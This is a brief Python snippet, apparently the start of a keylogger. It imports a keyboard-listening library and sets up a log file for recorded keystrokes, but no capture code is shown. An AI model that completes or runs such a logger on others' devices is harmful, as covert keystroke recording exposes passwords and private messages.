import keyboard                 #Import keyboard for listening to keystrokes
import logging                  #Imporet Logging for recording keystrokes
import datetime                 #Import Datetime to get time and date for keystrokes

log_file = "loggedKeys.log"     #creating a variable called log_file and assigning it the value "loggedKeys.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG) # Configuring basic logging settings, specifying the name of the log file and setting the logging level to DEBUG
